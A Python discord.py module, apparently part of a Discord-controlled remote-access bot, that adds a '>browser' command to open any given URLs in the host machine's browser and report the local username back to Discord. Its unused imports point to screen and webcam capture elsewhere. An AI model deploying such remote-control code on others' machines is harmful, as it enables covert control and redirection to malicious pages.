import getpass
import os
import platform
import pwd
import re
import socket
import textwrap
import uuid
from datetime import datetime
from PIL import ImageGrab
from functools import partial
import discord
import psutil
import requests
import pyautogui
import cv2
import asyncio
import time
import random
import string
import webbrowser
from discord.ext import commands


class Fun(commands.Cog, description="System Information"):

    def __init__(self, client: commands.Bot):
        self.client = client

    @commands.command()
    async def browser(self, ctx, *url):
        """
        Usage:
            >browser <*url>

        Example:
            >browser google.com yahoo.com gmail.com

        Paramaters:
            <*url>
                a URL List seperated by spaces(" ") 
                Link defaults to http protocol
        """
        try:
            all_links = "**Opened URLs:** \n"
            for link in url:
                link = str(link) if str(link).startswith(
                    "http") == True else "http://" + str(link)
                webbrowser.open(link)
                all_links += f"{link}\n"

            embed = discord.Embed(
                title=f"Opened {len(url)} {'URLs' if len(url) > 1 else 'URL'} in {getpass.getuser()}'s Browser",
                description=all_links,
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)

        except Exception as e:
            await ctx.send(str(e))
            return


def setup(client: commands.Bot):
    client.add_cog(Fun(client))
